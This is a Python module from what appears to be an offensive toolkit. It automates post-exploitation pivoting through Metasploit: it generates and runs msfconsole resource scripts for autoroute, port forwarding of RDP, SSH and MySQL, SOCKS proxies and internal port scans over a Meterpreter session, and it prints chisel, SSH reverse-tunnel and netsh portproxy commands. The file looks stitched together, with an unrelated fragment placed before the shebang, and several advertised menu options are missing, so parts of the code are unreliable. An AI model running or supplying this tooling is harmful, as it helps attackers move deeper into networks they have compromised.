
def box(title, icon="⚔️"):
    print()
    print(f"[31m[1m  ┌{'─'*46}┐[0m")
    print(f"[31m[1m  │[0m  [32m[1m{icon}  [33m[1m{title}[0m  [31m[1m{' '*(43-len(title))}[0m")
    print(f"[31m[1m  └{'─'*46}┘[0m")
    print()

section_header = box

def move_to_sdcard(filepath):
    if not os.path.exists(filepath):
        return False
    for sd in ["/sdcard", "/storage/emulated/0"]:
        if os.path.exists(sd):
            dest = os.path.join(sd, os.path.basename(filepath))
            try:
                import shutil as _sh
                _sh.copy2(filepath, dest)
                print(f"  [32m[1m  ✅ Moved to {dest}[0m")
                return True
            except:
                pass
    print(f"  [36m[1m  ➜ {filepath}[0m")
    return False
#!/usr/bin/env python3
"""Pivoting & Tunneling Module"""

import os
import sys
import shutil
import subprocess

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"], capture_output=True)
    from colorama import Fore, Style, init
    init(autoreset=True)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
D, BRIGHT, RESET = Style.DIM, Style.BRIGHT, Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR (same as main.py)
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
    shutil.which("msfconsole") or "",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    common = {
        "msfconsole": MSF_PATHS,
        "msfvenom": ["~/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"],
        "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"],
        "john": ["/usr/bin/john"],
        "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"],
        "dirb": ["/usr/bin/dirb"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def info(msg):
    print(f"  {C}{BRIGHT}  ℹ️  ➤ {msg}{RESET}")

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ ✔ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ ✘ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆ {B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def get_ip(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def box_alias(title, icon="🔗"):
    print()
    print(f"{R}{BRIGHT}  ╔════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}{BRIGHT}  ║{RESET}  {G}{BRIGHT}  {icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(63-len(title))}║{RESET}")
    print(f"{R}{BRIGHT}  ╚════════════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def generate_rc_and_run(commands, name="pivot"):
    rc_file = f"/tmp/{name}.rc"
    with open(rc_file, 'w') as f:
        for cmd in commands:
            f.write(cmd + "\n")
    info(f"Generated: {rc_file}")
    os.system(f"{get_msf_path()} -r {rc_file}")

def pivoting_menu():
    section_header("PIVOTING & TUNNELING", "🔗")
    
    print(f"""
  {Y}═══ MSF AUTOROUTE ═══{RESET}
  {M}[1]{RESET}   {G}Add Route via Session{RESET}
  {M}[2]{RESET}   {G}List Active Routes{RESET}
  {M}[3]{RESET}   {G}Delete Route{RESET}
  {M}[4]{RESET}   {G}Auto Route (auto-detect){RESET}
  ─────────────────────────────────
  {Y}═══ PORT FORWARDING ═══{RESET}
  {M}[5]{RESET}   {G}Forward Port (portfwd add){RESET}
  {M}[6]{RESET}   {G}List Port Forwards{RESET}
  {M}[7]{RESET}   {G}Delete Port Forward{RESET}
  {M}[8]{RESET}   {G}RDP Port Forward (3389){RESET}
  {M}[9]{RESET}   {G}SSH Port Forward (22){RESET}
  {M}[10]{RESET}  {G}HTTP Port Forward (80){RESET}
  {M}[11]{RESET}  {G}MySQL Port Forward (3306){RESET}
  {M}[12]{RESET}  {G}Custom Port Forward{RESET}
  ─────────────────────────────────
  {Y}═══ SOCKS PROXY ═══{RESET}
  {M}[13]{RESET}  {G}SOCKS4a Proxy Server{RESET}
  {M}[14]{RESET}  {G}SOCKS5 Proxy Server{RESET}
  {M}[15]{RESET}  {G}SOCKS Proxy + Proxychains{RESET}
  {M}[16]{RESET}  {G}SSH Dynamic Proxy (Dante){RESET}
  ─────────────────────────────────
  {Y}═══ TUNNELING ═══{RESET}
  {M}[17]{RESET}  {G}SSH Tunnel (Local){RESET}
  {M}[18]{RESET}  {G}SSH Tunnel (Reverse){RESET}
  {M}[19]{RESET}  {G}SSH Tunnel (Dynamic){RESET}
  {M}[20]{RESET}  {G}Chisel Tunnel{RESET}
  {M}[21]{RESET}  {G}Ngrok Tunnel{RESET}
  {M}[22]{RESET}  {G}FRP Tunnel{RESET}
  {M}[23]{RESET}  {G}Ligolo Tunnel{RESET}
  {M}[24]{RESET}  {G}Plink Tunnel{RESET}
  {M}[25]{RESET}  {G}Netsh Port Forward (Windows){RESET}
  ─────────────────────────────────
  {Y}═══ ADVANCED PIVOTING ═══{RESET}
  {M}[26]{RESET}  {G}Multi-hop Pivot{RESET}
  {M}[27]{RESET}  {G}Dual-homed Host Pivot{RESET}
  {M}[28]{RESET}  {G}Internal Network Scan via Pivot{RESET}
  {M}[29]{RESET}  {G}Lateral Movement via Pivot{RESET}
  {M}[30]{RESET}  {G}Custom Pivot Script{RESET}
  {M}[0]{RESET}   {R}🔙 Back{RESET}
""")
    
    choice = input(f"  {C}{BRIGHT}Choose [0-30]: {RESET}").strip()
    if choice == "0":
        return
    
    session_id = get_ip("Meterpreter Session ID: ", "1")
    target = get_ip("Target Subnet/IP: ", "192.168.2.0/24")
    lhost = get_ip("LHOST (your IP): ", "0.0.0.0")
    
    if choice == "1":
        cmds = [f"sessions -i {session_id}", f"run autoroute -s {target}", "background"]
        generate_rc_and_run(cmds, "autoroute")
    elif choice == "2":
        cmds = [f"use post/multi/manage/autoroute", "set SESSION " + session_id, "run"]
        generate_rc_and_run(cmds, "route_list")
    elif choice == "3":
        subnet = get_ip("Subnet to remove: ", "192.168.2.0/24")
        cmds = [f"sessions -i {session_id}", f"run autoroute -d -s {subnet}", "background"]
        generate_rc_and_run(cmds, "route_del")
    elif choice == "4":
        cmds = [f"use post/multi/manage/autoroute", "set SESSION " + session_id, "set AUTO true", "run"]
        generate_rc_and_run(cmds, "autoroute_auto")
    elif choice in ["5", "8", "9", "10", "11", "12"]:
        port_map = {"5": get_ip("Local Port: ", "8080"), "8": "3389", "9": "22", "10": "80", "11": "3306"}
        local_port = port_map.get(choice, get_ip("Local Port: ", "8080"))
        remote_port = get_ip("Remote Port: ", local_port)
        remote_host = get_ip("Remote Host: ", target)
        cmds = [f"sessions -i {session_id}", f"portfwd add -L {lhost} -l {local_port} -p {remote_port} -r {remote_host}", "background"]
        generate_rc_and_run(cmds, f"portfwd_{choice}")
    elif choice == "6":
        cmds = [f"sessions -i {session_id}", "portfwd list", "background"]
        generate_rc_and_run(cmds, "portfwd_list")
    elif choice == "7":
        id_del = get_ip("Forward ID to delete: ", "0")
        cmds = [f"sessions -i {session_id}", f"portfwd delete -i {id_del}", "background"]
        generate_rc_and_run(cmds, "portfwd_del")
    elif choice in ["13", "14"]:
        socks_type = "4a" if choice == "13" else "5"
        port = get_ip("SOCKS proxy port: ", "1080")
        cmds = [f"use auxiliary/server/socks{socks_type}", f"set SRVPORT {port}", "run"]
        generate_rc_and_run(cmds, f"socks{socks_type}")
    elif choice == "15":
        port = get_ip("SOCKS proxy port: ", "1080")
        cmds = [f"use auxiliary/server/socks5", f"set SRVPORT {port}", "run"]
        generate_rc_and_run(cmds, "socks5")
        info("Configure proxychains:")
        print(f"  {Y}echo 'socks5 127.0.0.1 {port}' >> /etc/proxychains.conf{RESET}")
    elif choice in ["17", "18", "19"]:
        local_port = get_ip("Local Port: ", "8080")
        remote_host = get_ip("Remote Host: ", target)
        remote_port = get_ip("Remote Port: ", "80")
        if choice == "17":
            info(f"SSH Tunnel: ssh -L {local_port}:{remote_host}:{remote_port} {lhost}")
        elif choice == "18":
            info(f"SSH Reverse Tunnel: ssh -R {local_port}:{remote_host}:{remote_port} {lhost}")
        else:
            info(f"SSH Dynamic: ssh -D {local_port} {lhost}")
    elif choice == "20":
        info("Chisel Tunnel:")
        info(f"  Server: chisel server -p 8080 --reverse")
        info(f"  Client: chisel client {lhost}:8080 R:socks")
    elif choice == "21":
        info("Ngrok Tunnel:")
        os.system(f"ngrok tcp {get_ip('Port: ', '4444')}")
    elif choice == "25":
        port = get_ip("Port to forward: ", "4444")
        info(f"netsh interface portproxy add v4tov4 listenport={port} listenaddress=0.0.0.0 connectport={port} connectaddress={lhost}")
    elif choice == "28":
        cmds = [f"use auxiliary/scanner/portscan/tcp", f"set RHOSTS {target}", "run"]
        generate_rc_and_run(cmds, "pivot_scan")
    elif choice == "30":
        info("Custom pivot script:")
        print(f"  {Y}Use autoroute + portfwd + socks for full network pivoting{RESET}")
